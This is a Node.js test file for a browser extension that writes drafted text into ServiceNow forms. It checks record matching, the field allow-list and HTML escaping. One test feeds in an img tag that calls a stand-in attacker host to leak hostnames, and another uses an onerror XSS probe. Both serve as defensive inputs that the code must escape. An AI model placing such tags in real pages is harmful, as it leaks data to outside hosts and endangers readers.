import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { handleFillField } from '../src/content/fill.js';
import { performInsert } from '../src/sidepanel/insertFlow.js';

// The whole insert path with nothing faked in the middle: the panel builds the message (performInsert), the content script checks it
// (handleFillField), and the page bridge (src/page/bridge.js, run in a vm) writes to a fake g_form. What matters is what g_form ends
// up with, and that it is never touched when something is wrong.

const BRIDGE = fs.readFileSync(path.join(__dirname, '..', 'src', 'page', 'bridge.js'), 'utf8');
const A = 'a'.repeat(32);
const B = 'b'.repeat(32);

function startBridge(g_form) {
  const listeners = {};
  const responses = [];
  const doc = {
    addEventListener: (type, fn) => (listeners[type] = fn),
    dispatchEvent: (event) => (responses.push(event), true),
    querySelector: () => null,
    querySelectorAll: () => [],
  };
  const sandbox = {
    document: doc,
    location: { pathname: '/incident.do', search: '', hash: '' },
    frames: [],
    CustomEvent: class CustomEvent {
      constructor(type, init) {
        this.type = type;
        this.detail = init.detail;
      }
    },
    g_form,
  };
  sandbox.window = sandbox;
  vm.createContext(sandbox);
  vm.runInContext(BRIDGE, sandbox);
  let n = 0;
  return async (action, args) => {
    responses.length = 0;
    listeners['ab-page-request']({ detail: { id: `t${(n += 1)}`, action, args } });
    const detail = responses[0].detail;
    if (!detail.ok) throw new Error(detail.error);
    return JSON.parse(JSON.stringify(detail.result));
  };
}

function system({ openRecord = { table: 'incident', sysId: A }, openNew = null, href = 'https://x.service-now.com/incident.do', fieldType = '', existing = {} } = {}) {
  const writes = [];
  const held = { ...existing };
  const g_form = {
    hasField: () => true,
    getValue: (name) => held[name] || '',
    getEditableFields: () => ['comments', 'work_notes', 'text', 'short_description', 'description', 'body'],
    isReadOnly: () => true,
    // (as ServiceNow's g_form: what was set is what getValue answers next; the bridge reads the value back)
    setValue: (name, value) => {
      writes.push([name, value]);
      held[name] = value;
    },
    ...(fieldType ? { getGlideUIElement: () => ({ type: fieldType }) } : {}),
  };
  const callPage = startBridge(g_form);
  const deps = {
    callPage,
    currentRecord: async () => openRecord,
    currentNewRecord: async () => openNew,
    href: () => href,
  };
  const page = { tabId: 9, href, record: openRecord, newRecord: openNew };
  // the panel's send(): chrome.tabs.sendMessage -> the content script
  const send = (_tab, message) => handleFillField(message, deps);
  return { writes, page, send };
}

test('markup in an article body reaches the HTML field as characters, not as a tag', async () => {
  const sys = system({ openRecord: null, openNew: { table: 'kb_knowledge' }, fieldType: 'html', href: 'https://x.service-now.com/kb_knowledge.do?sys_id=-1' });
  const spec = { field: 'text', fieldLabel: 'Article body', table: 'kb_knowledge' };
  const value = 'Symptoms\nIt fails.\n\n<img src="https://attacker.example/p.gif?d=hostnames">';
  // the review stops it first ...
  const held = await performInsert({ page: sys.page, spec, value, expect: { table: 'kb_knowledge', newRecord: true }, send: sys.send });
  assert.equal(held.status, 'findings');
  assert.deepEqual(sys.writes, []);
  // ... and when the person insists, what the form gets is escaped text
  const out = await performInsert({ page: sys.page, spec, value, force: true, expect: { table: 'kb_knowledge', newRecord: true }, send: sys.send });
  assert.equal(out.status, 'inserted');
  assert.equal(sys.writes.length, 1);
  assert.equal(sys.writes[0][0], 'text');
  assert.ok(sys.writes[0][1].includes('&lt;img src=&quot;https://attacker.example'), sys.writes[0][1]);
  assert.ok(!sys.writes[0][1].includes('<img'), 'no live tag');
  assert.equal(sys.writes[0][1], '<p>Symptoms<br>It fails.</p>\n<p>&lt;img src=&quot;https://attacker.example/p.gif?d=hostnames&quot;&gt;</p>');
});

test('<img src=x onerror=1> typed into the article body yields &lt;img in the form', async () => {
  const sys = system({ openRecord: null, openNew: { table: 'kb_knowledge' }, fieldType: 'html' });
  const out = await performInsert({ page: sys.page, spec: { field: 'text' }, value: '<img src=x onerror=1>', force: true, expect: null, send: sys.send });
  assert.equal(out.status, 'inserted');
  assert.ok(sys.writes[0][1].includes('&lt;img'));
});

test('an HTML-typed field that the list does not know is refused, not filled with raw text', async () => {
  // description is a plain field in the list, but this instance made it an HTML field
  const sys = system({ fieldType: 'html' });
  const out = await performInsert({ page: sys.page, spec: { field: 'description' }, value: 'plain words', send: sys.send });
  assert.equal(out.status, 'failed');
  assert.equal(out.answer.reason, 'bad-field');
  assert.deepEqual(sys.writes, []);
});

test('a draft written for INC1 is not inserted into INC2: the form is never touched', async () => {
  const sys = system({ openRecord: { table: 'incident', sysId: B } });
  const out = await performInsert({ page: sys.page, spec: { field: 'comments', fieldLabel: 'Additional comments' }, value: 'Hello, we restarted it.', expect: { table: 'incident', sysId: A }, number: 'INC0010001', send: sys.send });
  assert.equal(out.status, 'failed');
  assert.equal(out.answer.reason, 'wrong-record');
  assert.equal(out.why, 'This was written for INC0010001. Open that ticket again, or use Copy.');
  assert.deepEqual(sys.writes, []);
  // the right record is filled
  const right = system();
  const ok = await performInsert({ page: right.page, spec: { field: 'comments' }, value: 'Hello, we restarted it.', expect: { table: 'incident', sysId: A }, send: right.send });
  assert.equal(ok.status, 'inserted');
  assert.deepEqual(right.writes, [['comments', 'Hello, we restarted it.']]);
});

test('a title is replaced even when the panel asks to append, and a work note is appended below what is there', async () => {
  const sys = system({ existing: { short_description: 'Old title', work_notes: 'First note' } });
  await performInsert({ page: sys.page, spec: { field: 'short_description', mode: 'append' }, value: 'New title', send: sys.send });
  await performInsert({ page: sys.page, spec: { field: 'work_notes' }, value: 'Second note', send: sys.send });
  assert.deepEqual(sys.writes, [['short_description', 'New title'], ['work_notes', 'First note\n\nSecond note']]);
});

test('the field list is enforced even if the panel were to ask for another field', async () => {
  const sys = system();
  const out = await performInsert({ page: sys.page, spec: { field: 'assigned_to' }, value: 'beth.anglin', send: sys.send });
  assert.equal(out.status, 'failed');
  assert.equal(out.answer.reason, 'bad-field');
  assert.deepEqual(sys.writes, []);
});

test('the email body goes only into the email form of the record the draft is for', async () => {
  const href = (id) => `https://x.service-now.com/email_client.do?sysparm_table=incident&sysparm_sys_id=${id}`;
  const spec = { field: 'body', fieldLabel: 'Body' };
  const expect = { email: true, table: 'incident', sysId: A };
  const own = system({ openRecord: null, openNew: { table: 'sys_email' }, href: href(A) });
  assert.equal((await performInsert({ page: own.page, spec, value: 'Hello', expect, send: own.send })).status, 'inserted');
  assert.deepEqual(own.writes, [['body', 'Hello']]);
  const other = system({ openRecord: null, openNew: { table: 'sys_email' }, href: href(B) });
  assert.equal((await performInsert({ page: other.page, spec, value: 'Hello', expect, send: other.send })).answer.reason, 'wrong-record');
  assert.deepEqual(other.writes, []);
});
